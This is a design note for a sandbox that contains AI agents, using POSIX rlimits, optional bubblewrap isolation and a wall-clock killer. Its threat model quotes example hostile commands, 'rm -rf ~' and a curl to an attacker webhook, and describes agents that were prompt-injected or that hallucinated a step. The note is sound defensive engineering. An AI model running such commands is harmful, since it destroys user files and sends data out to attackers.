# Design Note: AgentSandbox — RLIMIT + optional bubblewrap

- **Status:** Draft
- **Tracking issue:** _to be filed_
- **Author:** @shangdinggu
- **Last updated:** 2026-05-08
- **Tracks roadmap:** [`0002-daemon-foundation-roadmap.md`](./0002-daemon-foundation-roadmap.md) (Phase 1 — fault domain)
- **Builds on:** [`0003-agent-process-and-event-log.md`](./0003-agent-process-and-event-log.md)

This RFC closes the third Phase-1 invariant: **blast radius = 1 agent**.
A misbehaving agent — fork-bombing, allocating until OOM, looping
forever, writing 50 GB to disk, dialling out to random hosts — must not
take down the daemon, the host, the user's `$HOME`, or its sibling
agents. RFC 0003 gave us identity and durability; this RFC gives us the
fence.

The design is layered:

1. **Always-on:** POSIX `setrlimit` enforced in the child before
   `execve`. Cheap, universal (Linux + macOS), and sufficient against
   honest mistakes. CPU time, address space, file size, file descriptor
   count, child-process count, core dumps.
2. **Opt-in (Linux only):** `bubblewrap` namespacing. Read-only / writable
   bind mounts, optional network unshare, isolated /tmp, new PID/IPC/UTS
   namespaces. Defends against deliberately curious agents that want to
   read `~/.ssh/` or curl out to a webhook.
3. **Always-on:** wall-clock killer thread in the parent. RLIMIT_CPU
   measures CPU time, not wall time; an agent that sleeps for an hour
   would otherwise ride the rails to completion. The supervisor sets a
   `wall_seconds` budget; the kernel sandbox runs a side-thread that
   `SIGKILL`s the process group on expiry.

This RFC ships as a **purely additive** helper module
(`kernel/sandbox.py`). No existing code is touched. F-4 (subprocess
agent runner, separate PR) will adopt it; until then the module is
exercised only by tests.

## 1. Threat model

The realistic threat in v1 is a **buggy or naive agent**, not a
deliberately malicious one. Concretely:

- Agent generates code with an infinite loop or accidental fork-bomb.
- Agent calls a tool that allocates until OOM.
- Agent writes 50 GB to `/tmp/` because it forgot to limit a download.
- Agent calls `os.system("rm -rf ~")` because the LLM hallucinated a
  cleanup step.
- Agent runs `curl webhook.attacker.com` because it was prompt-injected
  by hostile content fed in via a Web search tool.

**Out of scope** in v1:

- Defending against an agent process that has root or sudo.
- Defending against side-channel attacks (Spectre, /proc inspection,
  signal-based covert channels).
- Defending the user from themselves (a user explicitly granting
  `bind_rw=("$HOME",)` in their own policy gets what they ask for).
- TLS interception or cert pinning — handled at the network layer if at
  all.
- A truly hostile agent that has root and can `unshare` its way out — if
  you reach that threat level, run agents in a VM, not bubblewrap.

The boundary we commit to: **a non-root agent inside this sandbox cannot
exhaust host resources, cannot read user files outside its bind-mounted
view, and cannot make outbound network connections when
`deny_network=True`.**

## 2. Data model

### `SandboxPolicy`

```python
@dataclass(frozen=True)
class SandboxPolicy:
    # ── CPU / memory / IO limits (POSIX setrlimit) ────────────────────
    cpu_seconds:    int | None = None       # RLIMIT_CPU  (soft+hard)
    memory_bytes:   int | None = None       # RLIMIT_AS   (virtual mem)
    fsize_bytes:    int | None = None       # RLIMIT_FSIZE
    nproc:          int | None = None       # RLIMIT_NPROC
    nofile:         int | None = None       # RLIMIT_NOFILE
    core_size:      int = 0                 # RLIMIT_CORE — disable cores

    # ── Wall-clock (parent-side killer thread) ────────────────────────
    wall_seconds:   float | None = None

    # ── Filesystem isolation (bubblewrap, Linux) ──────────────────────
    use_bubblewrap: bool = False
    bind_ro:        tuple[str, ...] = ()    # absolute paths
    bind_rw:        tuple[str, ...] = ()
    workdir:        str | None = None       # cwd inside sandbox

    # ── Network ───────────────────────────────────────────────────────
    deny_network:   bool = False

    # ── Process group ─────────────────────────────────────────────────
    new_session:    bool = True             # detach for clean SIGKILL
```

Validation:

- All numeric limits must be ≥ 1 if set; ``None`` means unlimited.
- ``bind_ro`` / ``bind_rw`` paths must be absolute and exist.
- ``deny_network=True`` requires ``use_bubblewrap=True`` (kernel-level
  net namespace requires the bwrap layer).

### `SandboxResult`

```python
@dataclass(frozen=True)
class SandboxResult:
    exit_code:   int            # 0 on clean exit, -SIGKILL on kill
    stdout:      bytes
    stderr:      bytes
    duration_s:  float          # wall time
    timed_out:   bool           # killed by wall_seconds enforcer
    rlimit_hit:  str | None     # 'cpu', 'memory', 'fsize', None
    killed:      bool
```

### Defaults

Three named profiles for the supervisor to pick:

```python
SANDBOX_OFF     = SandboxPolicy()                                  # no limits
SANDBOX_DEFAULT = SandboxPolicy(
    cpu_seconds=300,           # 5 min CPU
    memory_bytes=2 * 1024**3,  # 2 GB
    fsize_bytes=1 * 1024**3,   # 1 GB max single file
    nproc=64,
    nofile=1024,
    wall_seconds=900,          # 15 min wall
    new_session=True,
)
SANDBOX_STRICT  = SandboxPolicy(
    cpu_seconds=120,           # 2 min CPU
    memory_bytes=512 * 1024**2,
    fsize_bytes=64 * 1024**2,
    nproc=16,
    nofile=256,
    wall_seconds=300,
    use_bubblewrap=True,
    deny_network=True,
    bind_ro=("/usr", "/lib", "/lib64", "/etc/resolv.conf"),
    new_session=True,
)
```

Defaults are tunable (the dataclass is frozen but the supervisor
re-creates one per agent). RFC 0006 (ResourceLedger) eventually drives
these from per-agent quota grants; until then the supervisor picks a
profile by template name.

## 3. Enforcement mechanisms

### 3.1 RLIMIT (always-on, POSIX)

Applied via a `preexec_fn` passed to `subprocess.Popen`. The function
runs in the child after `fork()` but before `execve()`, so the limits
take effect for the spawned program, not the daemon.

```python
def apply_rlimits_in_child(policy):
    def _apply():
        # Resource module limits…
        if policy.cpu_seconds is not None:
            resource.setrlimit(resource.RLIMIT_CPU,
                               (policy.cpu_seconds, policy.cpu_seconds))
        if policy.memory_bytes is not None:
            resource.setrlimit(resource.RLIMIT_AS,
                               (policy.memory_bytes, policy.memory_bytes))
        # …etc
        if policy.new_session:
            os.setsid()
    return _apply
```

Important properties:

- `preexec_fn` is **not async-signal-safe**, but we only call
  `setrlimit` and `setsid` which are well-behaved post-fork.
- `RLIMIT_NPROC` on Linux limits the **calling user's total processes**,
  not just descendants. Setting it too low can wedge unrelated
  daemon-side threads. We document this and only honour `nproc` when
  `use_bubblewrap=True` (which provides a PID namespace) OR the caller
  explicitly opts in via an environment-managed exception. Default
  policies set `nproc` only when bubblewrap is on.

### 3.2 Bubblewrap (opt-in, Linux)

Bubblewrap is a setuid-free, unprivileged-namespace sandbox tool
(`/usr/bin/bwrap`). When `policy.use_bubblewrap=True` and bwrap is
detected, the kernel sandbox prepends `bwrap` arguments to the user
argv:

```
bwrap
  --unshare-pid --unshare-ipc --unshare-uts
  [--unshare-net]                                  # if deny_network
  --proc /proc --dev /dev --tmpfs /tmp
  --ro-bind /usr /usr  --ro-bind /lib /lib  ...    # inherited from bind_ro
  --bind /agents/<pid>/work /workspace             # inherited from bind_rw
  --chdir /workspace
  --die-with-parent
  --                                                # end of bwrap args
  argv...
```

`--die-with-parent` is critical: if the daemon crashes, bubblewrap kills
the agent; we don't leak orphaned sandboxed processes.

### 3.3 Wall-clock enforcer (always-on)

`run_sandboxed(argv, policy, ...)` returns a `SandboxedProcess` context
manager. On entry, if `wall_seconds` is set, it spawns a daemon thread
that:

```
deadline = time.monotonic() + wall_seconds
while not finished:
    sleep min(0.5, deadline - time.monotonic())
    if time.monotonic() >= deadline:
        os.killpg(pgid, SIGTERM)   # graceful first
        sleep 1.0
        os.killpg(pgid, SIGKILL)   # then forceful
        result.timed_out = True
        break
```

`new_session=True` means we have a process group to address; without
it, the killer can only address the immediate child, leaving its
descendants behind. Default `new_session=True` is therefore load-bearing.

## 4. Public API

```python
# kernel/sandbox.py

def detect_isolation_tools() -> dict[str, str | None]:
    """Return {'bubblewrap': '/usr/bin/bwrap' or None,
              'firejail':   '/usr/bin/firejail' or None}.
    Used by the supervisor to decide whether to honour
    use_bubblewrap=True (degrade to RLIMIT-only if missing)."""

def apply_rlimits_in_child(policy: SandboxPolicy) -> Callable[[], None]:
    """Return a preexec_fn that applies the policy's RLIMITs and
    optionally calls setsid()."""

def wrap_with_bubblewrap(argv: Sequence[str],
                         policy: SandboxPolicy) -> list[str]:
    """Return argv prefixed with bwrap and the right namespace flags.
    Raises SandboxNotAvailable if use_bubblewrap=True but bwrap is
    missing."""

def run_sandboxed(argv: Sequence[str], policy: SandboxPolicy,
                  *, stdin: bytes | None = None,
                  env: Mapping[str, str] | None = None,
                  cwd: str | None = None) -> SandboxResult:
    """One-shot: spawn under policy, capture stdout/stderr, enforce
    wall-clock, return SandboxResult. Convenient for tests and short
    tools; supervisor will use the lower-level building blocks."""
```

Errors raised:

- ``SandboxPolicyError`` — policy validation failed (bad limit value,
  non-existent bind path, deny_network without bubblewrap, …).
- ``SandboxNotAvailable`` — policy requires bubblewrap but it's not
  installed.
- ``SandboxKilled`` — internal sentinel surfaced via `SandboxResult.killed`.

## 5. Platform matrix

| Platform | RLIMIT | bubblewrap | wall enforcer |
|---|---|---|---|
| Linux | full | full (if installed) | full |
| macOS | most (no `RLIMIT_NPROC` in the same shape) | not available | full |
| Windows | none (no `resource` module) | not available | partial — wall enforcer works via taskkill, but RLIMIT degrades to no-op and the policy raises a warning |

The kernel sandbox tolerates platform gaps: setting a limit that the
platform doesn't honour logs a warning and continues. The single hard
error is `use_bubblewrap=True` on a system without bwrap (we refuse to
silently downgrade because that would change the security posture
without telling the caller).

## 6. Backwards compatibility

This module is a brand-new file in `kernel/`. Nothing else in the
codebase changes. F-4 (subprocess agent runner) will be the first
consumer; until F-4 lands, the only callers are tests.

The kernel sandbox **does not** replace `research/lab/sandbox.py`. That
module is a one-shot Python-code-execution helper tightly coupled to
the lab's experiment workflow; it has its own threat model and its own
defaults. A future RFC can refactor lab/sandbox to layer on top of
`kernel.sandbox` once F-4 has proven the API. Until then the two
coexist with no shared code.

## 7. Acceptance criteria

A PR claiming this RFC must:

1. Run `pytest tests/` green on Linux. The kernel.sandbox tests
   spawn real subprocesses and verify each enforced limit by
   provoking it.
2. Verify with bubblewrap installed: filesystem bind isolation works
   (an agent can't read `~/.ssh/`), network deny works (an agent
   can't open a socket to 1.1.1.1).
3. Verify without bubblewrap installed: RLIMIT-only policies still
   work; `use_bubblewrap=True` raises `SandboxNotAvailable`.
4. No existing module is modified.

## 8. Open questions

1. **Should `wall_seconds` default to non-`None` even in
   `SANDBOX_DEFAULT`?** A wall-clock killer is the only protection
   against `time.sleep(86400)`. Current draft defaults to 15 min. **Lean
   yes.**
2. **Should `nproc` apply without bubblewrap?** The Linux semantics
   ("per-uid total") are surprising and dangerous if the daemon's
   user is also running other things. Current draft: no. RFC 0006 may
   override once we have per-agent UID separation.
3. **Should we accept seccomp filters in `SandboxPolicy`?** Tempting
   (deny `mmap` with `PROT_EXEC`, deny `clone` with new namespace
   flags). Out of scope for v1: seccomp BPF is a substantial extra
   surface and the threat model doesn't require it. Will revisit when
   adopting nsjail.
